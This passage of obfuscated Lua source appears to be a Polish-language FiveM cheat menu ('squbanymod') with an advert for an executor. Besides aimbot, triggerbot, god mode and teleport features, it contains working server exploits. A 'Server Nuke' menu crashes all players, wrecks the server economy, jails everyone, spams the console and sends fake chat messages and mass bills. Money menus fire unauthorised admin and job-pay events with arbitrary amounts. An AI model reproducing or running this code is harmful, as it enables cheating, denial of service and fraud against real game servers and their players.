                if squbanymod.Button("Teleportacja Do Znacznika", "~g~Użyj") then
                    NertigelFunc.teleportToWaypoint()
                    squbanymod.PushNotification("Teleportowano!", 5000)
                elseif
                    squbanymod.ComboBox(
                        "Teleport To",
                        {"Rynek", "Farma Maryhy", "Farma Mety", "Farma Koki", "Pralnia Hajsu", "Komenda Mission Row"},
                        QTn0uZ,
                        Ls,
                ...
                elseif squbanymod.Button("Teleportacja Do Kordów", "~g~Użyj") then
                    local dTHJfwnTI = KeyboardInput("X", "", 10)
                    local TUXp2D1KV5nKk = KeyboardInput("Y", "", 10)
                    local Y8N5kyPcRIaA = KeyboardInput("Z", "", 10)
                ...
                elseif squbanymod.CheckBox("Pokasz Twoje Koordynaty", NF3U) then
                    NF3U = not NF3U
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleOptions") then
                if squbanymod.MenuButton("Opcje Auta", "vehicleLosSantosCustoms") then
                elseif squbanymod.MenuButton("Spawn Auta", "vehicleSpawnList") then
                elseif squbanymod.CheckBox("God Mod Na Auto", C8RfqDn) then
                    C8RfqDn = not C8RfqDn
                elseif squbanymod.Button("Napraw Auto", "~g~Użyj") then
                    NertigelFunc.repairVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                elseif squbanymod.Button("Obróć Auto", "~g~Użyj") then
                    SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
                elseif squbanymod.Button("Usuń Auto", "~g~Użyj") then
                    NertigelFunc.deleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                elseif squbanymod.CheckBox('Boost Start/Stop  ~r~(!)', VehSpeed, function(dl) VehSpeed = dl end) then
                    squbanymod.PushNotification("Naciśnij SHIFT Żeby Wyjebać W Kosmos", 5000)
                elseif
                    squbanymod.ComboBoxSlider(
                        "Boost Silnika",
                        y7uMZQ2Z3TAVfx0,
                ...
                elseif squbanymod.CheckBox("Kolorowe Auto", fmT) then
                    fmT = not fmT
                elseif squbanymod.CheckBox("Obniż Auto", KzFsC7pbI) then
                    KzFsC7pbI = not KzFsC7pbI
                elseif squbanymod.CheckBox("Jebny Dym Spod opon", ai) then
                    ai = not ai
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("weaponOptions") then
                if squbanymod.MenuButton("Daj Jedną Broń", "weaponOptionsTypes") then
                elseif squbanymod.Button("Daj Wszystkie Bronie", "~g~Użyj") then
                    NertigelFunc.sPO.giveAllWeapons(GetPlayerPed(-1))
                elseif squbanymod.Button("Usuń Wszystkie Bronie", "~g~Użyj") then
                ...
                elseif
                 ...
                 then
                elseif squbanymod.CheckBox("Wybuchowe Pociski", MIPSqLh9aOgDF2JHx) then
                    MIPSqLh9aOgDF2JHx = not MIPSqLh9aOgDF2JHx
                elseif squbanymod.CheckBox("Szybkostrzelność", cAMZ5H60uTxQqSP) then
                    cAMZ5H60uTxQqSP = not cAMZ5H60uTxQqSP
                elseif squbanymod.CheckBox("Włącz TriggerBota  ~r~(!)", enableTriggerBot) then
                    enableTriggerBot = not enableTriggerBot
                elseif squbanymod.CheckBox("Włącz Aimbota  ~r~(!)", QwnbTipwbcG) then
                    QwnbTipwbcG = not QwnbTipwbcG
                end

                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("serverOptions") then
                squbanymod.SetSubTitle("serverOptions", "Connected Server IP: " .. GetCurrentServerEndpoint())
                if squbanymod.MenuButton("Zasoby Serwera", "serverOptionsResources") then
                elseif squbanymod.MenuButton("Triggery Serwera", "serverOptionsTriggerEvents") then
                elseif
                    squbanymod.ComboBoxSlider(
                        "Ilość Lokalnych",
                        pedDensityXWords,
                 ...
                 then
                    ...
                    if squbanymod.Button("REKLAMA | ZOBA F8", "Client") then
                        print("GodMod Najlepsze Mod Menu Do Fivema Developer SqubanY#0069 Kurwo | BTW Red Engine Najlepszy Executor")
                end
				
			squbanymod.Display()
            elseif squbanymod.IsMenuOpened('modelsOptions') then
				if squbanymod.Button('~y~~h~Zmień Się W~b~ Michael') then
				...
				elseif squbanymod.Button('~y~~h~Zmień Się W~g~ Franklin') then
				...
				elseif squbanymod.Button('~y~~h~Zmień Się W~o~ Trevor') then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Clown') then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Mime') then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Stripper') then
			local model = "s_f_y_stripper_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Cop M') then
			local model = "s_m_y_cop_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Cop F') then
			local model = "s_f_y_cop_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Sheriff M') then
			local model = "S_M_Y_Sheriff_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Sheriff F') then
			local model = "S_F_Y_Sheriff_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W ~b~SWAT M') then
			local model = "S_M_Y_Swat_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Armoured Ranger M') then
			local model = "S_M_M_Armoured_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Ranger F') then
			local model = "S_F_Y_Ranger_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Ranger Male') then
			local model = "S_M_Y_Ranger_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Robot Ranger Male') then
			local model = "U_M_Y_RSRanger_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Marine 01') then
			local model = "S_M_Y_Marine_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Marine 02') then
			local model = "S_M_Y_Marine_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Marine 03') then
			local model = "S_M_Y_Marine_03"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Marine Commander') then
			local model = "S_M_M_Marine_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Marine General') then
			local model = "S_M_M_Marine_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Black OPS1 M') then
			local model = "S_M_Y_BlackOps_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Black OPS2 M') then
			local model = "S_M_Y_BlackOps_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Black OPS3 M') then
			local model = "S_M_Y_BlackOps_03"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Prison Guard M') then
			local model = "S_M_M_PrisGuard_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~b~ Paramedic M') then
			local model = "S_M_M_Paramedic_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~y~ Vagos F') then
			local model = "G_F_Y_Vagos_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~g~ Ramp Gang M') then
			local model = "IG_Ramp_Gang"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~g~ Ramp Gang Boss M') then
			local model = "CSB_Ramp_gang"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~g~ Fam Gang 02 M') then
			local model = "G_M_Y_FamDNF_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~g~ Fam Gang Boss M') then
			local model = "G_M_Y_FamCA_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~p~ Bella Gang 01 M') then
			local model = "G_M_Y_BallaEast_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~p~ Bella Gang 02 M') then
			local model = "G_M_Y_BallaSout_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~p~ Bella Gang F') then
			local model = "G_F_Y_Ballas_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~p~ Bella Gang Boss M') then
			local model = "G_M_Y_BallaOrig_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Jewel F') then
			local model = "U_F_Y_JewelAss_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Jewel Thief') then
			local model = "U_M_M_JewelThief"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~o~ Prisoner 01 M') then
			local model = "S_M_Y_PrisMuscl_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~o~ Prisoner 02 M') then
			local model = "S_M_Y_Prisoner_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~o~ Prisoner 03 M') then
			local model = "U_M_Y_Prisoner_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Body Builder 01 M') then
			local model = "A_M_Y_MusclBeac_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Body Builder 02 M') then
			local model = "A_M_Y_MusclBeac_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Body Builder 03 M') then
			local model = "A_M_Y_Surfer_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Body Builder 04 M') then
			local model = "IG_TylerDix"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Napakowany M') then
			local model = "u_m_y_babyd"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Beach 01 F') then
			local model = "A_F_M_Beach_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Beach 02 F') then
			local model = "A_F_Y_Beach_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Beach Fat F') then
			local model = "A_F_M_FatCult_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 01') then
			local model = "A_F_Y_BevHills_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 02') then
			local model = "A_F_Y_BevHills_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 03') then
			local model = "A_F_Y_BevHills_03"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 04') then
			local model = "A_F_Y_BevHills_04"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 05') then
			local model = "CSB_Bride"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 06') then
			local model = "U_F_Y_PoppyMich"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 07') then
			local model = "A_F_Y_SouCent_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Female 08') then
			local model = "CSB_Anita"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Skater Female') then
			local model = "A_F_Y_Skater_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Old Man') then
			local model = "U_M_O_TapHillBilly"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Guy 01') then
			local model = "S_M_Y_Barman_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Guy 02') then
			local model = "A_M_Y_BreakDance_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Guy 03') then
			local model = "U_M_Y_Chip"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Guy 04') then
			local model = "U_M_Y_GunVend_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Guy 05') then
			local model = "CSB_Groom"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Rich Guy 06') then
			local model = "A_M_Y_Business_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Chinese M 01') then
			local model = "G_M_M_ChiBoss_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Chinese M 02') then
			local model = "G_M_M_ChiGoon_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Chinese M 03') then
			local model = "G_M_M_ChiGoon_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Chinese M 04') then
			local model = "CSB_Hao"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Chinese F') then
			local model = "A_F_Y_Vinewood_03"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean M 01') then
			local model = "A_M_Y_KTown_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean M 02') then
			local model = "A_M_Y_KTown_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean M 03') then
			local model = "G_M_M_KorBoss_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean M 04') then
			local model = "G_M_Y_Korean_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean M 05') then
			local model = "G_M_Y_Korean_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean F 01') then
			local model = "S_F_Y_MovPrem_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean F 02') then
			local model = "A_F_M_KTown_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean F 03') then
			local model = "A_F_M_KTown_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Korean F 04') then
			local model = "A_F_O_KTown_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 01') then
			local model = "A_M_M_MexCntry_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 02') then
			local model = "A_M_M_MexLabor_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 03') then
			local model = "A_M_Y_MexThug_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 04') then
			local model = "G_M_M_MexBoss_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 05') then
			local model = "G_M_M_MexBoss_02"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 06') then
			local model = "U_M_Y_Mani"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican M 07') then
			local model = "S_M_M_Mariachi_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican F') then
			local model = "U_F_Y_SpyActress"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Mexican HMaid F') then
			local model = "S_F_M_Maid_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Boar') then
			local model = "A_C_Boar"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Pig') then
			local model = "A_C_Pig"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Deer') then
			local model = "A_C_Deer"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Chicken') then
			local model = "A_C_Hen"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Hawk') then
			local model = "A_C_Chickenhawk"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Crow') then
			local model = "A_C_Crow"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Monkey') then
			local model = "A_C_Chimp"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W Animal~s~ Rat') then
			local model = "A_C_Rat"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~g~ Alien') then
			local model = "s_m_m_movalien_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Pongo') then
			local model = "u_m_y_pogo_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ Bartender F') then
			local model = "S_F_Y_Bartender_01"
                ...
                elseif squbanymod.Button('~y~~h~Zmień Się W~s~ FiveM') then
			local model = "MP_M_Freemode_01"
				...
				elseif squbanymod.Button('~p~~h~Zmień Się W~s~ Custom') then
			local model = KeyboardInput("Enter Name Of Model", "", 100000000)
                ...
                elseif squbanymod.Button('~c~~h~Randomize~s~ Clothing') then
				     SetPedRandomComponentVariation(PlayerPedId(), true)
				elseif squbanymod.Button('~c~~h~Default~s~ Clothing') then
				     SetPedDefaultComponentVariation(PlayerPedId(), true)
                end
				
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("serverNukerOptions") then
                squbanymod.SetSubTitle("serverNukerOptions", "Server Nuke Options")
            if squbanymod.Button("Zresp Na Wszystkich Pume") then
				...
				elseif squbanymod.Button("Zresp Zabitą Rybę Na Wszystkich") then
            ...
            elseif squbanymod.Button("Wypierdol Serwer  ~r~(!)") then
            nukeserver()
        elseif squbanymod.Button("Zaspam Server Konsole", "Server") then
            NertigelFunc.exploits.esx_spam_server_console()
        elseif squbanymod.Button("Wyślij Wszystkich Rachunek") then
            local amount1 = KeyboardInput("Wpisz Kwotę", "", 100000000)
            local name1 = KeyboardInput("Nazwa Ranchunku", "", 100000000)
            if amount1 and name1 then
            for i = 0, 128 do
            TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "squbanymod", name1, amount1)
            end
        end
    elseif squbanymod.Button("Wyślij Fake Wiadomość  ~r~(!)") then
        local da=KeyboardInput("Nazwa Która Ma Się Wyświetlić","",25)
        if da then
            local ck=KeyboardInput("Wiadomość","",100)
            if ck then
                TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
            end
        end
    elseif squbanymod.Button("Crashuj Wszystkich  ~r~(!)") then
        RapeAllFunc()
    elseif squbanymod.Button("Rozjeb Ekonomie  ~r~(!)") then
        esxdestroyv2()
    elseif squbanymod.Button("Wszyscy Do Więzienia  ~r~(!)") then
        for i = 1, 128 do
            ...
            TriggerServerEvent("js:jailuser", i, 45*60,"Jailed")
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("moneyOptions") then
            if squbanymod.Button("Dodawanie Hajsu  ~r~(!)", "Server") then
                NertigelFunc.exploits.esx_moneymaker()
            elseif squbanymod.MenuButton("ESX | Bogactwo Kurwo", "ESXmoneymenu") then
            elseif squbanymod.MenuButton("VRP | Bogactwo Kurwo", "vRPmoneymenu") then
            elseif
                    squbanymod.ComboBox(
                        "Zbierz  ~r~(!)",
                        {"Maryhe", "Opium", "Mete", "Koke"},
                        stjV43u5,
                        Tx70s70,
                ...
                elseif squbanymod.Button("Zresp Customowy Item  ~r~(!)", "Server") then
                    NertigelFunc.exploits.esx_spawncustomitem()
                elseif squbanymod.Button("Przestań Zbierać  ~r~(!)", "Server") then
                    NertigelFunc.exploits.esx_harvest_stop()
                elseif squbanymod.Button("Przemyj Brudną Gotówkę  ~r~(!)", "Server") then
                    NertigelFunc.exploits.esx_moneywash()
                end

                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("ESXmoneymenu") then
			if squbanymod.Button("Admin Do Banku  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif squbanymod.Button("Admin Do Kasy  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
                end
            elseif squbanymod.Button("Admin Daj Brudną Gotówke  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
            elseif squbanymod.Button("Trucker Wypłata  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif squbanymod.Button("Kurier Wypłata  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif squbanymod.Button("Bankier Wypłata  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif squbanymod.Button("Śmieciarz Wypłata  ~r~(!)") then
				local result = KeyboardInput("Wpisz Ilość Gotówki", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif squbanymod.Button("Force Your Job Paycheck  ~r~(!)") then
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vRPmoneymenu") then
                if squbanymod.Button("VRP Bank Wpłata  ~r~(!)") then
                    local amount = KeyboardInput("Wpisz Ilość Gotówki", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif squbanymod.Button("VRP Bank Wypłata  ~r~(!)") then
                    local amount = KeyboardInput("Wpisz Ilość Gotówki", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif squbanymod.Button("VRP Get Driver Licence") then
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("setjobmenu") then
                if squbanymod.Button("Bezrobotny") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
                elseif squbanymod.Button("Policjant") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif squbanymod.Button("Mechanik") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif squbanymod.Button("Taxi") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif squbanymod.Button("Ems") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif squbanymod.Button("Car Dealer") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("serverOptionsResources") then
                for i = 0, #RwFbMFt4elf6NNUg0kg do
                    if squbanymod.Button(RwFbMFt4elf6NNUg0kg[i]) then
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("menuSettings") then
                if squbanymod.MenuButton("Edytowanie Menu Keybindy", "keybindSettings") then
                elseif
                    squbanymod.ComboBox(
                        "Ustaw Menu X",
                        xMOzIZanu,
                        ...
                        function(jO, ppfCd)
                            ...
                            for i = 1, #menus_list do
                                squbanymod.SetMenuX(menus_list[i], xMOzIZanu[BJHuenN1n])
                            end
                        end
                    )
                 then
                elseif
                    squbanymod.ComboBox(
                        ...
                        function(Q2kijLQ1G9gxG7Szbsgu8, Gy5i5DWEL3Q)
                            ...
                            for i = 1, #menus_list do
                                squbanymod.SetMenuY(menus_list[i], JwvTSpXmUOVy_t[MNfWF9cuVmEKF38C05])
                            end
                        end
                    )
                 then
                elseif
                    squbanymod.ComboBox(
                        "Maxymalna Liczba Widocznych Opcji",
                        fI9wfgRBZtM,
                        F1iz,
                        _PAI7biS3pxqN,
                        function(g0fT, qw5)
                            ...
                            _PAI7biS3pxqN = qw5
                            for i = 1, #menus_list do
                                squbanymod.SetMaxOptionCount(menus_list[i], fI9wfgRBZtM[F1iz])
                            end
                        end
                    )
                 then
                    KxRMNSn0q7_cSUfk5FWwU = zjRtiTdduVltJH[selectedThemeIndex]
                    squbanymod.InitializeTheme()
                elseif squbanymod.Button("~r~Wyłącz Menu") then
                    squbanymod.CloseMenu()
                    NywuctsA4BD4b3_G0 = false
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("keybindSettings") then
                if squbanymod.Button("Otwieranie Menu", "[" .. openmenukeybind .. "]") then
                    print(json.encode(keyboard_keys))
                    local _L4 = string.upper(KeyboardInput("Input New Key Name", "", 10))
                    if keyboard_keys[_L4] then
                        openmenukeybind = _L4
                        squbanymod.PushNotification("Odpalanie Menu Zostało Zmienione Na ~g~" .. _L4, 5000)
                    else
                        squbanymod.PushNotification("Key " .. _L4 .. " Błąd!", 5000)
                    end
                elseif squbanymod.Button("Ulecz", "[" .. refillheatlhkeybind .. "]") then
                    print(json.encode(keyboard_keys))
                    ...
                    if keyboard_keys[op1Ho_QWAQZkQT6h] then
                        ...
                        squbanymod.PushNotification("Menu bind has been set to ~g~" .. op1Ho_QWAQZkQT6h, 5000)
                    else
                        squbanymod.PushNotification("Key " .. op1Ho_QWAQZkQT6h .. " is not valid!", 5000)
                    end
                elseif squbanymod.Button("Armor", "[" .. refillarmourkeybind .. "]") then
                    print(json.encode(keyboard_keys))
                    ...
                    if keyboard_keys[spctkDu8wWkT_SU] then
                        ...
                        squbanymod.PushNotification("Menu bind has been set to ~g~" .. spctkDu8wWkT_SU, 5000)
                    else
                        squbanymod.PushNotification("Key " .. spctkDu8wWkT_SU .. " is not valid!", 5000)
                    end
                    local NcAE4Q3eKJ = string.upper(KeyboardInput("Nowy Przycisk", "", 10))
                    if keyboard_keys[NcAE4Q3eKJ] then
                        magnetokeybind = NcAE4Q3eKJ
                        squbanymod.PushNotification("Nowy Przycisk Został Zmieniony Na ~g~" .. NcAE4Q3eKJ, 5000)
                    else
                        squbanymod.PushNotification("Key " .. NcAE4Q3eKJ .. " is not valid!", 5000)
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("weaponOptionsTypes") then
                for PTDJKt2IjGvuAZud, M16e2BIB3hmRRnU8uuh in pairs(weaponlist) do
                    if squbanymod.MenuButton(PTDJKt2IjGvuAZud, "weaponOptionsTypeSelection") then
                        fMY3bFUiVzL = M16e2BIB3hmRRnU8uuh
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("weaponOptionsTypeSelection") then
                for nTaFAoMT_AOqNiv, GyF5jyqzrGxQ_1sajn7h_M in pairs(fMY3bFUiVzL) do
                    if squbanymod.MenuButton(GyF5jyqzrGxQ_1sajn7h_M.name, "weaponModOptionsOptions") then
                        qwxBa75Z2xuL = GyF5jyqzrGxQ_1sajn7h_M
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("weaponModOptionsOptions") then
                if squbanymod.Button("Spawn Weapon") then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(qwxBa75Z2xuL.id), 1000.0, false)
                elseif squbanymod.Button("Add Ammo") then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(qwxBa75Z2xuL.id), 250.0)
                elseif squbanymod.CheckBox("Infinite Ammo", qwxBa75Z2xuL.bInfAmmo) then
                ...
                for c1vEOdl6ZwUWhmztKtDC5, PaJa2xOBwTdOYO8QeMTQL in pairs(qwxBa75Z2xuL.mods) do
                    if squbanymod.MenuButton(c1vEOdl6ZwUWhmztKtDC5, "weaponsModSelect") then
                        GFlGQ8Y3HDh1Mug2LxZ1 = PaJa2xOBwTdOYO8QeMTQL
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("weaponsModSelect") then
                for jAW8_mXYi7, YNw9iTJkkAMFoho in pairs(GFlGQ8Y3HDh1Mug2LxZ1) do
                    if squbanymod.Button(YNw9iTJkkAMFoho.name) then
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleLosSantosCustoms") then
                if squbanymod.MenuButton("Kosmetyczne Opcje", "vehicleLosSantosCustomsCosmetics") then
                elseif squbanymod.MenuButton("Opcje Silnika", "vehicleLosSantosCustomsPerformance") then
                elseif squbanymod.Button("Zmień Numery Tablicy", "~g~Użyj") then
                    local oIL8 = KeyboardInput("Nowe Numery:", "", 8)
                    if oIL8 ~= " " then
                        RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                        SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), oIL8)
                    end
                elseif squbanymod.Button("Maxymalny Tuning Silnika", "~g~Użyj") then
                    NertigelFunc.maxPerformanceUpgrades(GetVehiclePedIsIn(PlayerPedId()))
                elseif squbanymod.Button("Maxymalny Tuning", "~g~Użyj") then
                    NertigelFunc.maxUpgrades(GetVehiclePedIsIn(PlayerPedId()))
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleLosSantosCustomsCosmetics") then
                if IsPedInAnyVehicle(PlayerPedId(), 0) then
                else
                    if squbanymod.Button("Nie Jesteś W Pojeździe") then
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleLosSantosCustomsPerformance") then
                if IsPedInAnyVehicle(PlayerPedId(), 0) then
                    ...
                    if squbanymod.Button("Turbo", turboStatus) then
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("vehicleSpawnList") then
                if squbanymod.CheckBox("Zresp Z Max Upgrade", jU7z1fNT_Pbj85qJpm) then
                    jU7z1fNT_Pbj85qJpm = not jU7z1fNT_Pbj85qJpm
                elseif squbanymod.CheckBox("Zresp W Pojeździe", G8zTCymQ1Rx1) then
                    G8zTCymQ1Rx1 = not G8zTCymQ1Rx1
                elseif squbanymod.Button("Zresp Custom Auto  ~r~(!)", "~g~Użyj") then
                    local H_WU3HlZYvf7ph5Xc = KeyboardInput("Nazwa Auta", "", 100.0)
                    if H_WU3HlZYvf7ph5Xc and IsModelValid(H_WU3HlZYvf7ph5Xc) and IsModelAVehicle(H_WU3HlZYvf7ph5Xc) then
                        ...
                        squbanymod.PushNotification("Niema Takiego Modelu!!", 5000)
                    end
                elseif squbanymod.Button("Respawn Auta Aby Było Twoje  ~r~(!)", "Use") then
                    local cOFxD00346hyXWlRCrGv = KeyboardInput("Nazwa Auta | Może Być ADD ON |", "", 10)
